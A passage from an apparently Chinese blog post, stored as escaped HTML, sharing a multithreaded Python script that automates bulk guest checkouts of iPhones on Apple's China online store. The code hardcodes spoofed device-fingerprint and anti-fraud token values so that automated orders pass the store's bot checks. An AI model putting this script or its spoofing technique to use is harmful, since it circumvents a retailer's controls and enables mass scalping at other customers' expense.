class=\"string\">'shoppingCart.actions.fcsdata'</span>:<span class=\"string\">''</span>&#125;,headers=&#123;<span class=\"string\">\"x-aos-stk\"</span>:token&#125;,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\">#pdb.set_trace()</span></div><div class=\"line\">            signinUrl=json.loads(r.text,encoding=<span class=\"string\">'utf-8'</span>)[<span class=\"string\">'head'</span>][<span class=\"string\">'data'</span>][<span class=\"string\">'url'</span>]</div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"登录页面[GET] :: %s\"</span>%signinUrl[:<span class=\"number\">80</span>])</div><div class=\"line\"></div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]登录页面[GET] :: %s\"</span>%signinUrl</div><div class=\"line\">            r=session.get(signinUrl,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            guestBuyData=re.search(<span class=\"string\">r'\\\"signInGuest\\\":\\&#123;\\\"form\\\":\\\"login\\._forms\\.guestCheckoutForm\\\",\\\"url\\\":\\\"/cn/shop/sentryx/sign_in\\?(_a=login\\.guestSign.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            </div><div class=\"line\">            tmp = re.findall(<span class=\"string\">r'(.*?=.*?)&amp;'</span>,guestBuyData+<span class=\"string\">\"&amp;\"</span>)</div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tmp:</div><div class=\"line\">                data[i.split(<span class=\"string\">\"=\"</span>,maxsplit=<span class=\"number\">1</span>)[<span class=\"number\">0</span>]]=i.split(<span class=\"string\">\"=\"</span>,maxsplit=<span class=\"number\">1</span>)[<span class=\"number\">1</span>]</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 两个复杂参数，硬编码！  </span></div><div class=\"line\">            data[<span class=\"string\">'aywysya'</span>]=<span class=\"string\">'78a44j1d7lY5BNvcKyAdMUDFBpBeA0fUm7qKFz0XnjYrJFW73AuyPBB2SCVMvsD7z5meTuCUMz_WgpMVQdgGgeVjrkRGjftckcKyAd65hz74WySXvO3wa3wL6tqAhbrmQkLNbfyz.sU7zl998tp7ppeZLz77qZoOSix5ezdstlYrMxy0kyMpwoNLTK9Ly9nOVlQtb_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1aWuxXVvHe9FjpidPNs0ojpVMZ90L5H6fqUdHz15tTma1eWNieLqDxpHrk0ugN.xL438IXkb9CxN4t1VKWZWudUd.z9euVrAqJkJgghmeugN.VHBQLz4mvmfTT9oaSumKkpjlRiwerbXh8bUudQUhkY5BSmmY5BNkOdhs7GY6Mk.BY8'</span></div><div class=\"line\">            data[<span class=\"string\">'fdcBrowserData'</span>]=<span class=\"string\">'%257B%2522U%2522%253A%2522Mozilla%252F5.0%2520(Windows%253B%2520U%253B%2520Windows%2520NT%25206.1%253B%2520zh-CN)%2520AppleWebKit%252F533%252B%2520(KHTML%252C%2520like%2520Gecko)%2522%252C%2522L%2522%253A%2522zh-CN%2522%252C%2522Z%2522%253A%2522GMT%252B08%253A00%2522%252C%2522V%2522%253A%25221.0%2522%257D'</span></div><div class=\"line\">            tmpUrl = re.search(<span class=\"string\">r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/'</span>,r.text).group(<span class=\"number\">1</span>)+<span class=\"string\">'/cn/shop/sentryx/sign_in'</span></div><div class=\"line\">            logging.debug(<span class=\"string\">\"访客结账[POST] :: %s\"</span>%tmpUrl)</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]访客结账[POST] :: %s\"</span>%tmpUrl</div><div class=\"line\">            r = session.post(tmpUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            pltn = json.loads(r.text,encoding=<span class=\"string\">'utf-8'</span>)[<span class=\"string\">'head'</span>][<span class=\"string\">'data'</span>][<span class=\"string\">'args'</span>][<span class=\"string\">'pltn'</span>]</div><div class=\"line\">            checkoutStartUrl = json.loads(r.text,encoding=<span class=\"string\">'utf-8'</span>)[<span class=\"string\">'head'</span>][<span class=\"string\">'data'</span>][<span class=\"string\">'url'</span>]</div><div class=\"line\"></div><div class=\"line\">            logging.debug(<span class=\"string\">\"结账跳转-1 [POST] :: %s\"</span>%checkoutStartUrl)</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]结账跳转-1 [POST] :: %s\"</span>%checkoutStartUrl</div><div class=\"line\">            r = session.post(checkoutStartUrl,data=&#123;<span class=\"string\">'pltn'</span>:pltn&#125;,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            checkoutUrl = re.search(<span class=\"string\">r'&lt;form method=\\\"POST\\\" name=\\\"redirector\\\" action=\\\"(https://.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'pltn'</span>] = re.search(<span class=\"string\">r'&lt;input name=\"pltn\" type=\"\\w*?\" value=\"(.*?)\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'v'</span>] = re.search(<span class=\"string\">r'&lt;input name=\"v\" type=\"\\w*?\" value=\"(.*?)\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'&lt;input name=\"sessionID\" type=\"\\w*?\" value=\"(.*?)\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            logging.debug(<span class=\"string\">\"结账跳转-2 [POST] :: %s\"</span>%checkoutUrl)</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]结账跳转-2 [POST] :: %s\"</span>%checkoutUrl</div><div class=\"line\">            r = session.post(checkoutUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 送货选项 --&gt; 送货地址</span></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>]=re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            <span class=\"comment\"># data['A8']=re.search(r',\"deliveryLocationType\":\"(.*?)\",\"_forms\":&#123;\"main\":&#123;\"fields\":\\[&#123;\"id\":\"(cart-item-.*?deliveryLocationType)\",',r.text).group(1)</span></div><div class=\"line\">            <span class=\"comment\"># data['cartItem']=re.search(r',\"deliveryLocationType\":\"(.*?)\",\"_forms\":&#123;\"main\":&#123;\"fields\":\\[&#123;\"id\":\"(cart-item-.*?deliveryLocationType)\",',r.text).group(2)</span></div><div class=\"line\">            <span class=\"comment\">#data[re.search(r'\\\"id\\\":\\\"(cart-item-.*?deliveryLocationType)\\\",',r.text).group(1)]='A8'   # 2017-10-26发现该正则表达式存在匹配问题,匹配了超长的字符串</span></div><div class=\"line\">            data[re.search(<span class=\"string\">r'(cart-item-([0-9A-z]+-)&#123;5&#125;delivery-deliveryLocationType)'</span>,r.text).group(<span class=\"number\">1</span>)]=<span class=\"string\">'A8'</span></div><div class=\"line\">            </div><div class=\"line\">            data[<span class=\"string\">'_a'</span>]=<span class=\"string\">'cart.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>]=<span class=\"string\">'co'</span></div><div class=\"line\">            data[<span class=\"string\">'_m'</span>]=<span class=\"string\">'cart'</span></div><div class=\"line\">            <span class=\"comment\"># 有多台secure主机，需要从页面取值。</span></div><div class=\"line\">            checkoutxUrl = re.search(<span class=\"string\">r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/'</span>,r.text).group(<span class=\"number\">1</span>)+<span class=\"string\">'/cn/shop/checkoutx'</span></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"送货选项 --&gt; 送货地址[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]送货选项 --&gt; 送货地址[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 送货地址 --&gt; 付款</span></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-lastName'</span>] = order[<span class=\"string\">'lastName'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-firstName'</span>] = order[<span class=\"string\">'firstName'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-daytimePhoneAreaCode'</span>] = <span class=\"string\">'0'</span></div><div class=\"line\">            data[<span class=\"string\">'shipping-user-daytimePhone'</span>] = order[<span class=\"string\">'phone'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-state'</span>] = order[<span class=\"string\">'state'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-city'</span>] = order[<span class=\"string\">'city'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-district'</span>] = order[<span class=\"string\">'district'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-street'</span>] = order[<span class=\"string\">'street'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-street2'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'shipping-user-postalCode'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'shipping-user-emailAddress'</span>] = order[<span class=\"string\">'email'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-mobilePhone'</span>] = order[<span class=\"string\">'phone'</span>]</div><div class=\"line\">            data[<span class=\"string\">'state'</span>] = order[<span class=\"string\">'state'</span>]</div><div class=\"line\">            data[<span class=\"string\">'keyPath'</span>] = <span class=\"string\">'shipping.address'</span></div><div class=\"line\">            data[<span class=\"string\">'city'</span>] = order[<span class=\"string\">'city'</span>]</div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'ship.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"送货地址 --&gt; 付款[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]送货地址 --&gt; 付款[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 付款 --&gt; 发票</span></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'undefined'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'bankOption'</span>] = <span class=\"string\">'Alipay'</span></div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'bill.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"付款 --&gt; 发票[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]付款 --&gt; 发票[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 发票 --&gt; 账户</span></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceEmailAddress-emailAddress'</span>] = order[<span class=\"string\">'email'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-fapiao-invoiceHeader'</span>] = order[<span class=\"string\">'lastName'</span>]+order[<span class=\"string\">'firstName'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-fapiao-taxPayerId'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'invoice-form-options-selection'</span>] = <span class=\"string\">'personal'</span></div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-lastName'</span>] = order[<span class=\"string\">'lastName'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-firstName'</span>] = order[<span class=\"string\">'firstName'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-daytimePhoneAreaCode'</span>] = <span class=\"string\">'0'</span></div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-daytimePhone'</span>] = order[<span class=\"string\">'phone'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-companyName'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-state'</span>] = order[<span class=\"string\">'state'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-city'</span>] = order[<span class=\"string\">'city'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-district'</span>] = order[<span class=\"string\">'district'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-street'</span>] = order[<span class=\"string\">'street'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-street2'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-postalCode'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'state'</span>] = order[<span class=\"string\">'state'</span>]</div><div class=\"line\">            data[<span class=\"string\">'keyPath'</span>] = <span class=\"string\">'invoice.invoiceDeliveryAddress'</span></div><div class=\"line\">            data[<span class=\"string\">'city'</span>] = order[<span class=\"string\">'city'</span>]</div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'invoice.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"发票 --&gt; 账户[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]发票 --&gt; 账户[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 账户 --&gt; 条款与条件</span></div><div class=\"line\">            data = &#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'account-appleId'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'account-password'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'account-passwordAgain'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'account-commsPref'</span>] = <span class=\"string\">'false'</span></div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'acct.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"账户 --&gt; 条款与条件[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]账户 --&gt; 条款与条件[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            <span class=\"comment\"># 同意 条款与条件</span></div><div class=\"line\">            data = &#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'accept'</span>] = <span class=\"string\">'true'</span></div><div class=\"line\">            data[<span class=\"string\">'acceptAppleTnc'</span>] = <span class=\"string\">'false'</span></div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'terms.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"同意 条款与条件[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]同意 条款与条件[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 下订单</span></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'aywysya'</span>] = <span class=\"string\">'F8a44j1d7lY5BNvcKyAdMUDFBpBeA0fUm7qKFz0XnjYrJFW73AuyPBB2SCVMvsD7z5meTuCUMz_WgpMVQdgGgeVjrkRGjftckcKyAd65hz74WySXvO3wa3wL6tqAhbrmQkLNbfyz.sU7zl998tp7ppeZLz77qZoOSix5ezdstlYrMxy0kyMpwoNLTK9Ly8nOVlQtb_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1aWux_5ukV_AAUfSHolk2dUf.j7J1gBZEMgzH_y3Cmx_B4K1lSJhgSv_KU.6elV2pNJF_DA1RcrpVMZ90L5H6e0z1_yc4p0iMgdVdOOQ_KpNk0.ZNqhyA_r_LwwKdBvpZfWfUXtStKjE4PIDzpHqzQW5BNv__5BNlVnIQkFY5DjV.4v2'</span></div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'promo-code'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'po'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"下订单[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[存疑]下订单[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout*<span class=\"number\">2</span>)       <span class=\"comment\"># 此处timeout时间加倍</span></div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 订单状态</span></div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\">#checkoutStatusUrl = re.search(r'(https:\\/\\/.*?\\.apple\\.com)',checkoutxUrl).group(1)+json.loads(r.text,encoding='utf-8')['head']['data']['url']  </span></div><div class=\"line\">            checkoutStatusUrl = re.search(<span class=\"string\">r'(https:\\/\\/.*?\\.apple\\.com)'</span>,r.url).group(<span class=\"number\">1</span>)+re.search(<span class=\"string\">r'\\\"url\\\":\\\"(.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[存疑]订单状态-0 :: %s\"</span>%tmpUrl</div><div class=\"line\">            r = session.get(checkoutStatusUrl,timeout=retryTimeout)</div><div class=\"line\"></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'_a'</span>]=<span class=\"string\">'status'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>]=<span class=\"string\">'co'</span></div><div class=\"line\">            data[<span class=\"string\">'_m'</span>]=<span class=\"string\">'commo'</span></div><div class=\"line\">            tmpUrl = re.search(<span class=\"string\">r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/'</span>,r.text).group(<span class=\"number\">1</span>)+<span class=\"string\">'/cn/shop/checkoutx/status'</span></div><div class=\"line\"></div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[存疑]订单状态-1 :: %s\"</span>%tmpUrl</div><div class=\"line\">        </div><div class=\"line\">            r = session.post(tmpUrl,data=data,timeout=retryTimeout)</div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\">#tmpUrl = json.loads(r.text,encoding='utf-8')['head']['data']['url']   # 错误</span></div><div class=\"line\">            tmpUrl = re.search(<span class=\"string\">r'(https:\\/\\/.*?\\.apple\\.com)'</span>,r.url).group(<span class=\"number\">1</span>)+re.search(<span class=\"string\">r'\\\"url\\\":\\\"(.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"订单状态 :: %s\"</span>%tmpUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[存疑]订单状态-2 :: %s\"</span>%tmpUrl</div><div class=\"line\">            r = session.get(tmpUrl,timeout=retryTimeout)</div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\"># tmpUrl=json.loads(r.text,encoding='utf-8')['head']['data']['url'] #报错</span></div><div class=\"line\">            tmpUrl = re.search(<span class=\"string\">r'(https:\\/\\/.*?\\.apple\\.com)'</span>,r.url).group(<span class=\"number\">1</span>)+re.search(<span class=\"string\">r'\\\"url\\\":\\\"(.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[存疑]谢谢 :: %s\"</span>%tmpUrl</div><div class=\"line\">            r = session.get(tmpUrl,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            orderID = re.search(<span class=\"string\">r',\\\"orderNumber\\\":\\\"(.*?)\\\",'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            order[<span class=\"string\">'orderID'</span>] = orderID</div><div class=\"line\">            order[<span class=\"string\">'orderUrl'</span>]=<span class=\"string\">\"https://store.apple.com/xc/cn/vieworder/\"</span>+orderID+<span class=\"string\">\"/\"</span>+order[<span class=\"string\">'email'</span>]+<span class=\"string\">\"/\"</span></div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">'成功'</span></div><div class=\"line\">            </div><div class=\"line\">            msg=order[<span class=\"string\">'lastName'</span>]+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'firstName'</span>]+<span class=\"string\">\"\\t\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'product'</span>]+<span class=\"string\">\"\\t\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'color'</span>]+<span class=\"string\">\"\\t\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'capacity'</span>]+<span class=\"string\">\"\\t\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'orderUrl'</span>]</div><div class=\"line\">            print(<span class=\"string\">\" 🍻🍻🍻🍻🍻 \\t\\t%s\"</span>%msg)</div><div class=\"line\">            self.orderResult(order,<span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</div><div class=\"line\">            order[<span class=\"string\">'orderID'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            order[<span class=\"string\">'orderUrl'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            self.orderResult(order,<span class=\"keyword\">False</span>)  <span class=\"comment\"># 购买失败！</span></div><div class=\"line\">        <span class=\"comment\"># json订单格式使用！</span></div><div class=\"line\">        <span class=\"comment\"># tmp = order['fileFullName']</span></div><div class=\"line\">        <span class=\"comment\"># filePath,fileName = os.path.split(tmp)</span></div><div class=\"line\">        <span class=\"comment\"># newFileName= \"done_\"+order['lastName']+order['firstName']+\"_\"+orderID+\"_\"+order['email']+fileName</span></div><div class=\"line\">        <span class=\"comment\"># logging.info(\"修改订单文件 :: %s --&gt; %s\"%(fileName,newFileName)[:80])</span></div><div class=\"line\">        <span class=\"comment\"># os.rename(tmp,os.path.join(filePath,newFileName))</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">orderResult</span><span class=\"params\">(self,order,success)</span>:</span></div><div class=\"line\">        msg=order[<span class=\"string\">'lastName'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'firstName'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'phone'</span>]+<span class=\"string\">\",\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'email'</span>]+<span class=\"string\">\",\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'state'</span>]+<span class=\"string\">\",\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'city'</span>]+<span class=\"string\">\",\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'district'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'street'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'payment'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'product'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'color'</span>]+<span class=\"string\">\",\"</span>+\t\t    \\</div><div class=\"line\">            order[<span class=\"string\">'capacity'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'quantity'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'orderID'</span>]+<span class=\"string\">\",\"</span>+\t\t\\</div><div class=\"line\">            order[<span class=\"string\">'orderUrl'</span>]+<span class=\"string\">\",\"</span>+      \\</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]+<span class=\"string\">\"\\n\"</span></div><div class=\"line\">        self.threadLock.acquire()</div><div class=\"line\">        <span class=\"keyword\">with</span> open(orderResult,<span class=\"string\">'a+'</span>,encoding=<span class=\"string\">'utf-8'</span>) <span class=\"keyword\">as</span> fp:</div><div class=\"line\">            fp.writelines(msg)</div><div class=\"line\">        self.threadLock.release()</div><div class=\"line\"><span class=\"comment\"># 参数处理</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    headCharPic=<span class=\"string\">\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   &lt; Author: Mr.Bingo &gt;\\n      //   \\ \\   ------------------ \\n     (|     | ) &lt;    oddboy.cn     &gt;\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"</span></div><div class=\"line\">    print(headCharPic)</div><div class=\"line\">    <span class=\"comment\"># Creating a parser</span></div><div class=\"line\">    buyer=iPhoneBuyer()</div><div class=\"line\">    buyer.run_Threads()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h2 id=\"叨逼叨\"><a href=\"#叨逼叨\" class=\"headerlink\" title=\"叨逼叨\"></a>叨逼叨</h2><p>原本以为iPhone X会被疯抢，所谓八仙过海各显神通，我就想着用自己的野路子看看凑效不？</p>\n<p>经过几天的流程梳理，代码编写及优化，在27号前夕以iPhone 8作为测试，效果是灰常的好！<br></p>","more":"<br><img src=\"/2017/10/iPhoneX抢购Python脚本/image01.jpg\" alt=\"\"><p></p>\n<p>批量下单(iphone8/8p),跑了40个订单,每个订单一条线程，20秒左右全部订单成功，邮箱也瞬间收到几十封邮件：</p>\n<p><img src=\"/2017/10/iPhoneX抢购Python脚本/image02.png\" alt=\"\"></p>\n<h2 id=\"失落的转折\"><a href=\"#失落的转折\" class=\"headerlink\" title=\"失落的转折\"></a>失落的转折</h2><p>27日早上开始，苹果官网下单功能维护，直到下午三点功能才正常。 不过，在购物车跳转到支付页面的相关参数被改动了。所以，gg了！</p>\n<p><img src=\"/2017/10/iPhoneX抢购Python脚本/image03.png\" 